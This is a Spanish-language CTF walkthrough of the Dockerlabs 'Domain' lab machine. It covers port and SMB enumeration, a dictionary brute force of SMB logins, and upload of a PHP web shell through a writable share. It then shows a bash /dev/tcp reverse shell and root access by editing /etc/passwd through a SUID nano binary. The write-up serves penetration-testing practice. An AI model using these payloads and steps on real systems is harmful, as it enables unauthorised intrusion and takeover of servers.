
# Writeup Template: Maquina `[ Domain ]`

- Tags: #Domain
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Domain](https://mega.nz/file/4GMGGYpa#-aSLPKJxpmrvHGYi4jqLYaEVXEdGRkdJQLxPCfRI9t8)

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x domain.zip
sudo bash auto_deploy.sh domain.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p80,139,445 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
80/tcp  open  http        Apache httpd 2.4.52 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
```
---
## Enumeracion de [Servicio Web Principal]
direccion **URL** del servicio:
```bash
http://172.17.0.2/
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2 # No reporta nada critico
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2 # No reporta nada critico
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
	No reporta nada relevante

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -t 20 -x php,php.back,backup,sh,txt,html,js,pl
```

- **Hallazgos**:
```bash
/index.html           (Status: 200) [Size: 1832]
```

## Enumeracion De [Servicio SAMBA]
Primero enumeramos este servicio en busca de recursos compartidos o usarios mal configurados:
Procedemos a la enumeracion completa para este servicio:
```bash
enum4linux -a 172.17.0.2 
```

###### Usuarios Encontrados:
```bash
 ========================================( Users on 172.17.0.2 )========================================

index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: james    Name: james     Desc: 
index: 0x2 RID: 0x3e9 acb: 0x00000010 Account: bob      Name: bob       Desc: 

user:[james] rid:[0x3e8]
user:[bob] rid:[0x3e9]
```

###### Servicios compartidos:
```bash
 ==================================( Share Enumeration on 172.17.0.2 )==================================

smbXcli_negprot_smb1_done: No compatible protocol selected by server.

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        html            Disk      HTML Share
        IPC$            IPC       IPC Service (bd4d2efa697a server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
Protocol negotiation to server 172.17.0.2 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 172.17.0.2                                                                                   
//172.17.0.2/print$     Mapping: DENIED Listing: N/A Writing: N/A                                                            
//172.17.0.2/html       Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:                                                                                               
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                                   
//172.17.0.2/IPC$       Mapping: N/A Listing: N/A Writing: N/A
```

Realizaremos un ataque de fuerza bruta por diccionario a estos dos usuarios que logramos encontrar:
Para ello cremos un archivo: **users.txt** donde estaran almacenados los dos usuarios para despues aplicar fuerza bruta de la siguiente forma:
```bash
crackmapexec smb 172.17.0.2 -u users.txt -p /usr/share/wordlists/rockyou.txt
```

### Credenciales Encontradas
Tenemos la contrasena del usuario **bob**
```bash
SMB         172.17.0.2      445    8247985FD3CF     [+] 8247985FD3CF\bob:star 
```

Nos conectamos al servicio **SMB**
```bash
smbclient //172.17.0.2/html -U 'bob' --password='star'
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Revisando los recursos vemos que esta conectando este servicio con, el servicio web asi que lo que subamos se vera reflejado en la web
Asi que subiremos un archivo malicioso que nos permita ganar acceso al servidor 
### Ejecucion del Ataque
Crearemos un archivo bajo el nombre **( cmd.php )**. en nuestra maquina atacante
```php
<?php
  system($_GET["cmd"]);
?>
```

ahora desde **SMB** procedemos a subirlo:
```bash
smb: \> put cmd.php # Cargamos el archivo

putting file cmd.php as \cmd.php (32.2 kb/s) (average 32.2 kb/s)
smb: \> ls
  .                                   D        0  Sun Jun 15 21:39:45 2025
  ..                                  D        0  Thu Apr 11 08:18:47 2024
  cmd.php                             A       33  Sun Jun 15 21:39:45 2025
  index.html                          N     1832  Thu Apr 11 08:21:43 2024
```

Ahora desde la web lo ejecutaremos probando el comando: **( whoami )** para ver si funciona
```bash
# Comandos para explotación
http://172.17.0.2/cmd.php?cmd=whoami
```

### Intrusion
Ya teniendo ejecucion remota de comandos nos pones en escucha para ganar acceso al servidor
```bash
nc -nlvp 443
```

```bash
# Reverse shell o acceso inicial
172.17.0.2/cmd.php?cmd=bash -c 'exec bash -i %26>/dev/tcp/172.17.0.1/443 <%261'
```

---
## Escalada de Privilegios
### Enumeracion del Sistema
Listando los usuarios del sistema vemos los siguientes
```bash
# Comandos clave ejecutados
cat /etc/passwd | grep "sh"

root:x:0:0:root:/root:/bin/bash
bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
james:x:1001:1001:james,,,:/home/james:/bin/bash
```
### Explotacion de Privilegios

###### Usuario `[ www-date ]`:
Para este usuario probamos que se esta reciclando contrasenas asi que logramos migrar a **bob**
```bash
# Comando para escalar al usuario: ( bob )
su bob # ( star )
```
###### Usuario `[ bob ]`:
Listando binarios **SUID** tenemos los siguientes:
```bash
find / -perm -4000 2>/dev/null
```

Tenemos el binario **nano** con privilegios lo que nos permitiria migrar a **root** de la siguiente manera:
```
nano

ctrl + R
ctrl + X
reset; sh 1>&0 2>&0
```

Pero no funciono asi que tenemos que ver porque ver otra forma de migrar a **root** que es la siguiente:
En nuestra maquina de atacante crearemos una contrasena que es la que depues incrustaremos en el archivo: **( /etc/passwd )** para loguearnos depues con esa:
```bash
openssl passwd 12345

$1$qIkFPKSq$z4sfuoU.f9N05D7vc5u560 # Password que inyectaremos en el archivo
```

Ahora nos aprovecharemos que el binario de **nano** es **SUID** para editar el archivo **passwd** y en donde tiene la **X** de root la sustituimos por la contrasena que nosostros creamos
quedando asi el archivo:
```bash
root:$1$qIkFPKSq$z4sfuoU.f9N05D7vc5u560:0:0:root:/root:/bin/bash
```

Una ves guardado los cambios procedemos a loguearnos como root:
```bash
su root # ( 12345 )
```

---
## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@bd4d2efa697a:~# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a enumear el servicio **SMB**
2. Aprendimos a realizar fuerza bruta para este servicio
3. Aprendimos a explotar el binario del editor **nano** para poder ganar acceso como **root**

## Recomendaciones de Seguridad
- Evitar el uso de permisos **SUID** en binarios criticos del sistema.